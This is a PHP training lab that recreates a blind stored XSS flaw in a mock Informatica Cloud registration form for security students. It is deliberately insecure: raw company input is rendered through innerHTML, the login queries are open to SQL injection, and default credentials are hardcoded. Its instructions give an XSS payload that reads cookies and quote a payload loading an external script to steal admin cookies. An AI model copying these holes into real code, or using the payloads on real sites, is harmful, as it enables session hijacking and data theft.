<?php
// Lab 63 — Blind XSS in Registration Form
// Platform: Informatica Cloud (accounts.informatica.com) | HackerOne #1011888
// Vulnerability: Company field stored raw, rendered via innerHTML in admin panel
// Attack: Attacker registers with XSS payload, admin views user → XSS fires
// Severity: High — can steal admin cookies, leak backend data
// ── Database setup ──
$db_name = 'KrazePlanet';
$db_user = 'root';
$db_pass = '';
$hosts   = ['krazeplanet', '127.0.0.1', 'localhost', '172.19.0.1', 'host.docker.internal'];

$pdo = null;
$lastException = null;

foreach ($hosts as $host) {
    try {
        $pdo = new PDO("mysql:host=$host;charset=utf8mb4", $db_user, $db_pass, [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_TIMEOUT => 2
        ]);
        $pdo->exec("CREATE DATABASE IF NOT EXISTS `$db_name` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
        $pdo->exec("USE `$db_name`");
        break;
    } catch (PDOException $e) {
        $lastException = $e;
    }
}

if (!$pdo) {
    die("DB connection failed: " . ($lastException ? $lastException->getMessage() : "Unable to connect to database"));
}

$pdo->exec("CREATE TABLE IF NOT EXISTS lab63_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    email VARCHAR(150) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    company VARCHAR(200) DEFAULT '',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$pdo->exec("CREATE TABLE IF NOT EXISTS lab63_admins (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

// Create default admin
$chk = $pdo->query("SELECT id FROM lab63_admins WHERE username='admin'")->fetchColumn();
if (!$chk) {
    $pdo->prepare("INSERT INTO lab63_admins (username, password) VALUES (?, ?)")
        ->execute(['admin', password_hash('admin123', PASSWORD_DEFAULT)]);
}

// Seed demo users
$sc = $pdo->query("SELECT COUNT(*) FROM lab63_users")->fetchColumn();
if ($sc == 0) {
    $iu = $pdo->prepare("INSERT IGNORE INTO lab63_users (name, email, password, company) VALUES (?, ?, ?, ?)");
    $iu->execute(['John Smith', 'john@techcorp.com', password_hash('john@123', PASSWORD_DEFAULT), 'TechCorp Industries']);
    $iu->execute(['Sarah Connor', 'sarah@skynet.io', password_hash('sarah@123', PASSWORD_DEFAULT), 'Skynet Systems']);
    $iu->execute(['Mike Ross', 'mike@pearce.com', password_hash('mike@123', PASSWORD_DEFAULT), 'Pearson Hardman LLP']);
}

session_start();

$msg = '';
$view = $_GET['view'] ?? 'login';
$isAdmin = isset($_SESSION['admin_id']);
$isUser = isset($_SESSION['user_id']);

// Handle logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: index.php?view=login");
    exit;
}

// Handle registration
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'register') {
    $name = trim($_POST['name'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $company = trim($_POST['company'] ?? ''); // VULNERABLE: stored raw - no sanitization

    if (!$name || !$email || !$password) {
        $msg = '<div class="alert error">All fields are required.</div>';
    } else {
        $chk = $pdo->prepare("SELECT id FROM lab63_users WHERE email=?");
        $chk->execute([$email]);
        if ($chk->fetch()) {
            $msg = '<div class="alert error">Email already registered.</div>';
        } else {
            $pdo->prepare("INSERT INTO lab63_users (name, email, password, company) VALUES (?, ?, ?, ?)")
                ->execute([$name, $email, password_hash($password, PASSWORD_DEFAULT), $company]);
            $msg = '<div class="alert success">Account created! You can now <a href="?view=login">log in</a>.</div>';
            $view = 'register_success';
        }
    }
}

// Handle user login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'login_user') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $stmt = $pdo->prepare("SELECT id, name, email, company FROM lab63_users WHERE email=?");
    $stmt->execute([$email]);
    $row = $stmt->fetch();
    if ($row && password_verify($password, $pdo->query("SELECT password FROM lab63_users WHERE email='$email'")->fetchColumn())) {
        $_SESSION['user_id'] = $row['id'];
        $_SESSION['user_name'] = $row['name'];
        $_SESSION['user_email'] = $row['email'];
        $_SESSION['user_company'] = $row['company'];
        header("Location: index.php?view=dashboard");
        exit;
    } else {
        $msg = '<div class="alert error">Invalid credentials.</div>';
    }
}

// Handle admin login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'login_admin') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';
    $stmt = $pdo->prepare("SELECT id FROM lab63_admins WHERE username=?");
    $stmt->execute([$username]);
    $row = $stmt->fetch();
    if ($row && password_verify($password, $pdo->query("SELECT password FROM lab63_admins WHERE username='$username'")->fetchColumn())) {
        $_SESSION['admin_id'] = $row['id'];
        $_SESSION['admin_name'] = $username;
        header("Location: index.php?view=admin_dashboard");
        exit;
    } else {
        $msg = '<div class="alert error">Invalid admin credentials.</div>';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Informatica Cloud — Registration</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
    --primary: #1a56db;
    --primary-dark: #1e40af;
    --success: #059669;
    --danger: #dc2626;
    --bg: #f8fafc;
    --card-bg: #ffffff;
    --text: #1e293b;
    --text-muted: #64748b;
    --border: #e2e8f0;
    --shadow: 0 4px 6px -1px rgba(0,0,0,.1), 0 2px 4px -2px rgba(0,0,0,.1);
}

body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    line-height: 1.6;
}

/* Admin Theme */
body.admin-theme {
    --primary: #7c3aed;
    --primary-dark: #6d28d9;
    --bg: #0f172a;
    --card-bg: #1e293b;
    --text: #f1f5f9;
    --text-muted: #94a3b8;
    --border: #334155;
}

.nav {
    background: var(--card-bg);
    border-bottom: 1px solid var(--border);
    padding: 0 24px;
    height: 64px;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

body:not(.admin-theme) .nav {
    box-shadow: var(--shadow);
}

.nav-brand {
    display: flex;
    align-items: center;
    gap: 10px;
    text-decoration: none;
    color: var(--primary);
}

.nav-brand svg { width: 32px; height: 32px; }

.nav-brand-text {
    font-size: 1.25rem;
    font-weight: 700;
    color: var(--text);
}

.nav-brand-text span { color: var(--primary); }

.nav-links {
    display: flex;
    align-items: center;
    gap: 8px;
}

.nav-link {
    padding: 8px 16px;
    color: var(--text-muted);
    text-decoration: none;
    font-size: 0.875rem;
    font-weight: 500;
    border-radius: 6px;
    transition: all 0.2s;
}

.nav-link:hover {
    background: var(--border);
    color: var(--text);
}

.nav-link.active {
    background: var(--primary);
    color: #fff;
}

.container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 24px;
}

/* Auth Container */
.auth-wrapper {
    min-height: calc(100vh - 64px);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
}

.auth-card {
    background: var(--card-bg);
    border-radius: 12px;
    box-shadow: 0 10px 25px -5px rgba(0,0,0,.1);
    width: 100%;
    max-width: 440px;
    overflow: hidden;
}

.auth-header {
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    padding: 32px;
    text-align: center;
    color: #fff;
}

.auth-header h1 {
    font-size: 1.5rem;
    font-weight: 600;
    margin-bottom: 8px;
}

.auth-header p {
    opacity: 0.85;
    font-size: 0.9rem;
}

.auth-body {
    padding: 32px;
}

/* Forms */
.form-group {
    margin-bottom: 20px;
}

.form-label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    margin-bottom: 6px;
    color: var(--text);
}

.form-input {
    width: 100%;
    padding: 12px 14px;
    border: 1px solid var(--border);
    border-radius: 8px;
    font-size: 0.9rem;
    font-family: inherit;
    background: var(--card-bg);
    color: var(--text);
    transition: border-color 0.2s, box-shadow 0.2s;
}

.form-input:focus {
    outline: none;
    border-color: var(--primary);
    box-shadow: 0 0 0 3px rgba(26, 86, 219, 0.15);
}

.form-hint {
    font-size: 0.75rem;
    color: var(--text-muted);
    margin-top: 4px;
}

.form-hint.warning {
    color: var(--danger);
    font-weight: 500;
    background: #fef2f2;
    padding: 8px 10px;
    border-radius: 6px;
    border: 1px solid #fecaca;
}

.btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    padding: 12px 20px;
    border: none;
    border-radius: 8px;
    font-size: 0.9rem;
    font-weight: 600;
    font-family: inherit;
    cursor: pointer;
    transition: all 0.2s;
    text-decoration: none;
}

.btn-primary {
    background: var(--primary);
    color: #fff;
}

.btn-primary:hover {
    background: var(--primary-dark);
}

.btn-block { width: 100%; }

.btn-secondary {
    background: var(--bg);
    color: var(--text);
    border: 1px solid var(--border);
}

.btn-secondary:hover {
    background: var(--border);
}

/* Alerts */
.alert {
    padding: 12px 16px;
    border-radius: 8px;
    margin-bottom: 20px;
    font-size: 0.875rem;
}

.alert.success {
    background: #ecfdf5;
    color: #065f46;
    border: 1px solid #a7f3d0;
}

.alert.error {
    background: #fef2f2;
    color: #991b1b;
    border: 1px solid #fecaca;
}

/* Dashboard */
.dashboard-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 32px;
}

.dashboard-title {
    font-size: 1.75rem;
    font-weight: 700;
}

.stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 20px;
    margin-bottom: 32px;
}

.stat-card {
    background: var(--card-bg);
    border-radius: 12px;
    padding: 24px;
    border: 1px solid var(--border);
}

.stat-value {
    font-size: 2rem;
    font-weight: 700;
    color: var(--primary);
}

.stat-label {
    color: var(--text-muted);
    font-size: 0.875rem;
    margin-top: 4px;
}

/* Users Table */
.table-container {
    background: var(--card-bg);
    border-radius: 12px;
    border: 1px solid var(--border);
    overflow: hidden;
}

.table-header {
    padding: 16px 24px;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.table-title {
    font-size: 1rem;
    font-weight: 600;
}

table {
    width: 100%;
    border-collapse: collapse;
}

th, td {
    padding: 14px 24px;
    text-align: left;
    font-size: 0.875rem;
}

th {
    background: var(--bg);
    font-weight: 600;
    color: var(--text-muted);
    text-transform: uppercase;
    font-size: 0.75rem;
    letter-spacing: 0.05em;
}

tr:not(:last-child) td {
    border-bottom: 1px solid var(--border);
}

tr:hover td { background: var(--bg); }

.user-email { color: var(--primary); font-weight: 500; }
.user-company { font-weight: 500; }

/* Danger row for XSS payload */
tr.danger td {
    background: #fef2f2;
}

tr.danger:hover td { background: #fee2e2; }

/* Profile Card */
.profile-card {
    background: var(--card-bg);
    border-radius: 12px;
    padding: 32px;
    border: 1px solid var(--border);
    max-width: 500px;
}

.profile-header {
    display: flex;
    align-items: center;
    gap: 16px;
    margin-bottom: 24px;
    padding-bottom: 24px;
    border-bottom: 1px solid var(--border);
}

.profile-avatar {
    width: 64px;
    height: 64px;
    border-radius: 50%;
    background: var(--primary);
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-size: 1.5rem;
    font-weight: 600;
}

.profile-info h2 {
    font-size: 1.25rem;
    font-weight: 600;
}

.profile-info p {
    color: var(--text-muted);
    font-size: 0.875rem;
}

.profile-detail {
    display: flex;
    justify-content: space-between;
    padding: 12px 0;
    border-bottom: 1px solid var(--border);
}

.profile-detail:last-child { border-bottom: none; }

.profile-detail-label { color: var(--text-muted); font-size: 0.875rem; }
.profile-detail-value { font-weight: 500; }

/* Admin badge */
.admin-badge {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    background: var(--primary);
    color: #fff;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 0.75rem;
    font-weight: 600;
}

.user-badge {
    background: var(--success);
    color: #fff;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 0.75rem;
    font-weight: 600;
}

/* Test accounts box */
.test-accounts {
    background: var(--card-bg);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 16px;
    margin-top: 24px;
}

.test-accounts h4 {
    font-size: 0.8rem;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    color: var(--text-muted);
    margin-bottom: 12px;
}

.test-account {
    display: flex;
    justify-content: space-between;
    padding: 6px 0;
    font-size: 0.85rem;
    border-bottom: 1px solid var(--border);
}

.test-account:last-child { border-bottom: none; }

.test-account .role {
    color: var(--primary);
    font-weight: 500;
}

/* Grid for admin layout */
.admin-layout {
    display: grid;
    grid-template-columns: 240px 1fr;
    min-height: calc(100vh - 64px);
}

.admin-sidebar {
    background: #1e293b;
    padding: 24px 16px;
    border-right: 1px solid #334155;
}

.sidebar-nav {
    display: flex;
    flex-direction: column;
    gap: 4px;
}

.sidebar-link {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 12px 16px;
    color: #94a3b8;
    text-decoration: none;
    border-radius: 8px;
    font-size: 0.875rem;
    font-weight: 500;
    transition: all 0.2s;
}

.sidebar-link:hover {
    background: rgba(255,255,255,0.05);
    color: #fff;
}

.sidebar-link.active {
    background: var(--primary);
    color: #fff;
}

.sidebar-link svg {
    width: 18px;
    height: 18px;
}

.admin-main {
    padding: 24px;
    background: #0f172a;
    min-height: 100%;
}

.admin-welcome {
    background: linear-gradient(135deg, var(--primary), #9333ea);
    border-radius: 12px;
    padding: 24px 32px;
    color: #fff;
    margin-bottom: 24px;
}

.admin-welcome h2 {
    font-size: 1.5rem;
    font-weight: 600;
    margin-bottom: 8px;
}

.admin-welcome p {
    opacity: 0.9;
}
</style>
</head>
<body>

<!-- Navigation -->
<nav class="nav">
    <a href="?" class="nav-brand">
        <svg viewBox="0 0 32 32" fill="currentColor">
            <path d="M16 2C8.27 2 2 8.27 2 16s6.27 14 14 14 14-6.27 14-14S23.73 2 16 2zm0 4c5.52 0 10 4.48 10 10s-4.48 10-10 10S6 21.52 6 16 10.48 6 16 6z"/>
            <circle cx="16" cy="16" r="4"/>
        </svg>
        <span class="nav-brand-text">Informatica <span>Cloud</span></span>
    </a>
    <div class="nav-links">
        <?php if ($isUser): ?>
            <span class="user-badge">User</span>
            <a href="?view=dashboard" class="nav-link <?= $view === 'dashboard' ? 'active' : '' ?>">Dashboard</a>
            <a href="?action=logout" class="nav-link">Logout</a>
        <?php elseif ($isAdmin): ?>
            <span class="admin-badge">Admin</span>
            <a href="?view=admin_dashboard" class="nav-link <?= $view === 'admin_dashboard' ? 'active' : '' ?>">Dashboard</a>
            <a href="?action=logout" class="nav-link">Logout</a>
        <?php else: ?>
            <a href="?view=login" class="nav-link <?= $view === 'login' ? 'active' : '' ?>">Login</a>
            <a href="?view=register" class="nav-link <?= $view === 'register' ? 'active' : '' ?>">Register</a>
            <a href="?view=admin_login" class="nav-link <?= $view === 'admin_login' ? 'active' : '' ?>">Admin</a>
        <?php endif; ?>
    </div>
</nav>

<?php if ($view === 'register' || $view === 'register_success'): ?>
<!-- Registration Page -->
<div class="auth-wrapper">
    <div class="auth-card">
        <div class="auth-header">
            <h1>Create Your Account</h1>
            <p>Join thousands of companies using Informatica Cloud</p>
        </div>
        <div class="auth-body">
            <?= $msg ?>
            <?php if ($view === 'register_success'): ?>
                <div class="alert success">Registration successful! You can now log in.</div>
                <a href="?view=login" class="btn btn-primary btn-block">Go to Login</a>
            <?php else: ?>
            <form method="POST" action="">
                <input type="hidden" name="action" value="register">
                <div class="form-group">
                    <label class="form-label">Full Name</label>
                    <input type="text" name="name" class="form-input" placeholder="John Smith" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Email Address</label>
                    <input type="email" name="email" class="form-input" placeholder="john@company.com" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" name="password" class="form-input" placeholder="Minimum 8 characters" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Company Name</label>
                    <input type="text" name="company" class="form-input" placeholder="Acme Corporation">
                    <div class="form-hint warning">
                        ⚠ This field accepts any input including HTML content
                    </div>
                </div>
                <button type="submit" class="btn btn-primary btn-block">Create Account</button>
                <p style="text-align: center; margin-top: 16px; color: var(--text-muted); font-size: 0.875rem;">
                    Already have an account? <a href="?view=login" style="color: var(--primary);">Sign in</a>
                </p>
            </form>
            <?php endif; ?>
        </div>
    </div>
</div>

<?php elseif ($view === 'login'): ?>
<!-- User Login -->
<div class="auth-wrapper">
    <div class="auth-card">
        <div class="auth-header">
            <h1>Welcome Back</h1>
            <p>Sign in to your Informatica Cloud account</p>
        </div>
        <div class="auth-body">
            <?= $msg ?>
            <form method="POST" action="">
                <input type="hidden" name="action" value="login_user">
                <div class="form-group">
                    <label class="form-label">Email Address</label>
                    <input type="email" name="email" class="form-input" placeholder="you@company.com" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" name="password" class="form-input" placeholder="Your password" required>
                </div>
                <button type="submit" class="btn btn-primary btn-block">Sign In</button>
            </form>
            <div class="test-accounts">
                <h4>Test Accounts</h4>
                <div class="test-account">
                    <span>john@techcorp.com</span>
                    <span class="role">john@123</span>
                </div>
                <div class="test-account">
                    <span>sarah@skynet.io</span>
                    <span class="role">sarah@123</span>
                </div>
            </div>
            <p style="text-align: center; margin-top: 16px; color: var(--text-muted); font-size: 0.875rem;">
                No account? <a href="?view=register" style="color: var(--primary);">Register here</a>
            </p>
        </div>
    </div>
</div>

<?php elseif ($view === 'admin_login'): ?>
<!-- Admin Login -->
<div class="auth-wrapper">
    <div class="auth-card">
        <div class="auth-header" style="background: linear-gradient(135deg, #7c3aed, #6d28d9);">
            <h1>Admin Portal</h1>
            <p>Restricted access for administrators only</p>
        </div>
        <div class="auth-body">
            <?= $msg ?>
            <form method="POST" action="">
                <input type="hidden" name="action" value="login_admin">
                <div class="form-group">
                    <label class="form-label">Username</label>
                    <input type="text" name="username" class="form-input" placeholder="admin" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" name="password" class="form-input" placeholder="Your password" required>
                </div>
                <button type="submit" class="btn btn-primary btn-block">Admin Login</button>
            </form>
            <div class="test-accounts">
                <h4>Admin Credentials</h4>
                <div class="test-account">
                    <span>admin</span>
                    <span class="role">admin123</span>
                </div>
            </div>
        </div>
    </div>
</div>

<?php elseif ($view === 'dashboard' && $isUser): ?>
<!-- User Dashboard -->
<div class="container">
    <div class="dashboard-header">
        <h1 class="dashboard-title">My Profile</h1>
    </div>

    <div class="profile-card">
        <div class="profile-header">
            <div class="profile-avatar">
                <?= strtoupper(substr($_SESSION['user_name'], 0, 1)) ?>
            </div>
            <div class="profile-info">
                <h2><?= htmlspecialchars($_SESSION['user_name']) ?></h2>
                <p><?= htmlspecialchars($_SESSION['user_email']) ?></p>
            </div>
        </div>
        <div class="profile-detail">
            <span class="profile-detail-label">Email</span>
            <span class="profile-detail-value"><?= htmlspecialchars($_SESSION['user_email']) ?></span>
        </div>
        <div class="profile-detail">
            <span class="profile-detail-label">Company</span>
            <span class="profile-detail-value"><?= $_SESSION['user_company'] ?></span>
        </div>
        <div class="profile-detail">
            <span class="profile-detail-label">Account Type</span>
            <span class="user-badge">User</span>
        </div>
    </div>

    <div class="test-accounts" style="margin-top: 32px; background: #f0f9ff; border-color: #bae6fd;">
        <h4 style="color: #0369a1;">Lab Instructions</h4>
        <p style="color: #0c4a6e; font-size: 0.875rem; line-height: 1.7;">
            <strong>Blind XSS Challenge:</strong> To exploit this lab, register a new account with an XSS payload in the Company field (e.g., <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code>), then log in as admin to view users. The payload will execute when the admin views your registration data.
        </p>
    </div>
</div>

<?php elseif ($view === 'admin_dashboard' && $isAdmin): ?>
<!-- Admin Dashboard -->
<script>
document.body.classList.add('admin-theme');
</script>
<div class="admin-layout">
    <aside class="admin-sidebar">
        <nav class="sidebar-nav">
            <a href="?view=admin_dashboard" class="sidebar-link active">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
                Dashboard
            </a>
            <a href="?view=admin_users" class="sidebar-link">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
                Users
            </a>
            <a href="#" class="sidebar-link">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
                Settings
            </a>
        </nav>
    </aside>
    <main class="admin-main">
        <div class="admin-welcome">
            <h2>Welcome, <?= htmlspecialchars($_SESSION['admin_name']) ?>!</h2>
            <p>You have full access to manage registered users and view their information.</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card" style="background: #1e293b; border-color: #334155;">
                <div class="stat-value" style="color: #818cf8;">
                    <?php
                    $totalUsers = $pdo->query("SELECT COUNT(*) FROM lab63_users")->fetchColumn();
                    echo $totalUsers;
                    ?>
                </div>
                <div class="stat-label">Total Users</div>
            </div>
            <div class="stat-card" style="background: #1e293b; border-color: #334155;">
                <div class="stat-value" style="color: #34d399;"><?= date('d') ?></div>
                <div class="stat-label">Active Today</div>
            </div>
            <div class="stat-card" style="background: #1e293b; border-color: #334155;">
                <div class="stat-value" style="color: #fbbf24;">0</div>
                <div class="stat-label">Pending Review</div>
            </div>
        </div>

        <div class="table-container" style="background: #1e293b; border-color: #334155;">
            <div class="table-header" style="border-color: #334155;">
                <span class="table-title">Recent Registrations</span>
                <a href="?view=admin_users" class="btn btn-primary btn-sm">View All Users</a>
            </div>
            <table>
                <thead>
                    <tr style="background: #0f172a;">
                        <th style="color: #94a3b8;">Name</th>
                        <th style="color: #94a3b8;">Email</th>
                        <th style="color: #94a3b8;">Company</th>
                        <th style="color: #94a3b8;">Registered</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $recentUsers = $pdo->query("SELECT * FROM lab63_users ORDER BY created_at DESC LIMIT 5")->fetchAll();
                    foreach ($recentUsers as $u):
                    ?>
                    <tr>
                        <td><?= htmlspecialchars($u['name']) ?></td>
                        <td><span class="user-email"><?= htmlspecialchars($u['email']) ?></span></td>
                        <td class="user-company" id="company-cell-<?= $u['id'] ?>"><?= $u['company'] ?></td>
                        <td style="color: #94a3b8;"><?= date('M d, Y', strtotime($u['created_at'])) ?></td>
                    </tr>
                    <script>
                    // ⚠ VULNERABLE: Company field rendered via innerHTML — fires XSS payload
                    (function() {
                        var company = <?= json_encode($u['company']) ?>;
                        document.getElementById('company-cell-<?= $u['id'] ?>').innerHTML = company;
                    })();
                    </script>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <div style="background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 24px; margin-top: 24px;">
            <h3 style="color: #f1f5f9; margin-bottom: 16px; font-size: 1rem;">Lab Instructions for Students</h3>
            <p style="color: #94a3b8; font-size: 0.875rem; line-height: 1.7;">
                <strong>Attack Scenario:</strong> As an attacker, register a new account with an XSS payload in the Company field (e.g., <code style="background: #334155; padding: 2px 6px; border-radius: 4px;">&lt;img src=x onerror=alert(document.cookie)&gt;</code>). When an admin views the user list, the XSS payload will execute in the admin's browser, potentially stealing session cookies or performing actions on behalf of the admin.
            </p>
        </div>
    </main>
</div>

<?php elseif ($view === 'admin_users' && $isAdmin): ?>
<!-- Admin Users Page -->
<script>
document.body.classList.add('admin-theme');
</script>
<div class="admin-layout">
    <aside class="admin-sidebar">
        <nav class="sidebar-nav">
            <a href="?view=admin_dashboard" class="sidebar-link">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
                Dashboard
            </a>
            <a href="?view=admin_users" class="sidebar-link active">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
                Users
            </a>
            <a href="#" class="sidebar-link">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
                Settings
            </a>
        </nav>
    </aside>
    <main class="admin-main">
        <div style="margin-bottom: 24px;">
            <h1 style="color: #f1f5f9; font-size: 1.5rem; font-weight: 600;">All Registered Users</h1>
            <p style="color: #94a3b8; margin-top: 4px;">View and manage all user registrations</p>
        </div>

        <div class="table-container" style="background: #1e293b; border-color: #334155;">
            <table>
                <thead>
                    <tr style="background: #0f172a;">
                        <th style="color: #94a3b8;">ID</th>
                        <th style="color: #94a3b8;">Name</th>
                        <th style="color: #94a3b8;">Email</th>
                        <th style="color: #94a3b8;">Company</th>
                        <th style="color: #94a3b8;">Registered</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $allUsers = $pdo->query("SELECT * FROM lab63_users ORDER BY created_at DESC")->fetchAll();
                    foreach ($allUsers as $u):
                        $hasXSS = (stripos($u['company'], '<script') !== false || stripos($u['company'], 'onerror') !== false || stripos($u['company'], 'onload') !== false);
                    ?>
                    <tr class="<?= $hasXSS ? 'danger' : '' ?>">
                        <td style="color: #94a3b8;"><?= $u['id'] ?></td>
                        <td><?= htmlspecialchars($u['name']) ?></td>
                        <td><span class="user-email"><?= htmlspecialchars($u['email']) ?></span></td>
                        <td class="user-company" id="user-company-<?= $u['id'] ?>"><?= $u['company'] ?></td>
                        <td style="color: #94a3b8;"><?= date('M d, Y H:i', strtotime($u['created_at'])) ?></td>
                    </tr>
                    <script>
                    // ⚠ VULNERABLE: Company field rendered via innerHTML — fires XSS payload
                    (function() {
                        var company = <?= json_encode($u['company']) ?>;
                        document.getElementById('user-company-<?= $u['id'] ?>').innerHTML = company;
                    })();
                    </script>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <div style="background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 24px; margin-top: 24px;">
            <h3 style="color: #f1f5f9; margin-bottom: 8px;">⚠ Vulnerability Details</h3>
            <p style="color: #94a3b8; font-size: 0.875rem; line-height: 1.7;">
                The <strong>Company</strong> field in user registrations is stored without sanitization and rendered using <code style="background: #334155; padding: 2px 6px; border-radius: 4px;">innerHTML</code> in this admin view. This allows an attacker to inject malicious JavaScript that executes when an admin views the user list. This is a classic <strong>Blind XSS</strong> vulnerability — the attacker never sees the direct result of their attack (hence "blind").
            </p>
            <p style="color: #94a3b8; font-size: 0.875rem; margin-top: 12px;">
                <strong>Real-world impact (HackerOne #1011888):</strong> An attacker used payload <code style="background: #334155; padding: 2px 6px; border-radius: 4px;">"><script src=https://monty.xss.ht></script></code> to steal admin cookies, gaining access to the admin panel and exposing customer data including email addresses and internal server information.
            </p>
        </div>
    </main>
</div>

<?php else: ?>
<!-- Default: Login Page -->
<div class="auth-wrapper">
    <div class="auth-card">
        <div class="auth-header">
            <h1>Welcome to Informatica Cloud</h1>
            <p>Secure cloud data management platform</p>
        </div>
        <div class="auth-body" style="text-align: center;">
            <p style="color: var(--text-muted); margin-bottom: 24px;">Select an option to continue</p>
            <div style="display: flex; gap: 12px;">
                <a href="?view=login" class="btn btn-primary" style="flex: 1;">User Login</a>
                <a href="?view=register" class="btn btn-secondary" style="flex: 1;">Register</a>
            </div>
            <div style="margin-top: 16px;">
                <a href="?view=admin_login" style="color: var(--primary); font-size: 0.875rem;">Admin Portal →</a>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>

</body>
</html>